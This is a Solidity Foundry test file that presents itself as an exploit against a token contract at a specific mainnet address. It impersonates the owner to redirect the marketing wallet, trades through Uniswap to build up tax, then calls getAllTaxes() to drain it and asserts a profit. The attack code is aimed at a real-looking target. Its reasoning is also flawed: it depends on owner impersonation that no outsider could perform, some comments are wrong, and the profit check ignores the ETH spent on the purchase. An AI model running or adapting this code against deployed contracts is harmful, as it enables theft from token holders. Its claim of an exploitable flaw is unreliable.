contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5681152e9AD9628C1518266A9aB29B6d8B35693B;
    address attacker = address(this);
    address owner; // Declare owner as a state variable

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        owner = BabyDogeCoin20(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, 'Contract Owner');
        vm.label(attacker, 'Attacker');
        vm.label(TARGET, 'BabyDogeCoin20');

        // Start with some ETH for trading
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Impersonate the owner to set marketing wallet to attacker
        vm.startPrank(owner);
        BabyDogeCoin20(TARGET).setMarketingWallet(payable(attacker));
        vm.stopPrank();

        // Step 2: Get some tokens to generate tax
        // First, approve the router to spend our tokens if we have any
        // Actually, we need to buy tokens first to generate tax
        // Let's get the router address from the contract
        IUniswapV2Router02 router = IUniswapV2Router02(BabyDogeCoin20(TARGET).uniswapV2Router());
        address weth = router.WETH();
        address token = TARGET;

        // Approve router to spend our ETH
        vm.startPrank(attacker);

        // Buy tokens to generate tax accumulation
        // Create path: WETH -> token
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = token;

        // Swap 1 ETH for tokens (this will generate buy tax)
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0, // accept any amount
            path,
            attacker,
            block.timestamp
        );

        // Get token balance after purchase
        uint256 tokenBalance = BabyDogeCoin20(token).balanceOf(attacker);

        // Now sell half to generate sell tax (which goes to contract)
        // Approve router to spend tokens
        BabyDogeCoin20(token).approve(address(router), tokenBalance / 2);

        // Create reverse path: token -> WETH
        address[] memory sellPath = new address[](2);
        sellPath[0] = token;
        sellPath[1] = weth;

        // Swap tokens for ETH (generates sell tax)
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance / 2,
            0, // accept any amount
            sellPath,
            attacker,
            block.timestamp
        );

        vm.stopPrank();

        // Step 3: Check contract token balance (should have tax accumulated)
        uint256 contractTokenBalance = BabyDogeCoin20(token).balanceOf(token);
        require(contractTokenBalance > 0, "No tax accumulated");

        // Step 4: Record attacker's ETH balance before draining
        uint256 attackerBalanceBefore = attacker.balance;

        // Step 5: Call getAllTaxes() as attacker (now marketing wallet)
        vm.prank(attacker);
        BabyDogeCoin20(token).getAllTaxes();

        // Step 6: Verify attacker's ETH balance increased
        uint256 attackerBalanceAfter = attacker.balance;
        require(attackerBalanceAfter > attackerBalanceBefore, "No profit gained");

        console.log("Attacker ETH before:", attackerBalanceBefore);
        console.log("Attacker ETH after:", attackerBalanceAfter);
        console.log("Profit:", attackerBalanceAfter - attackerBalanceBefore);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

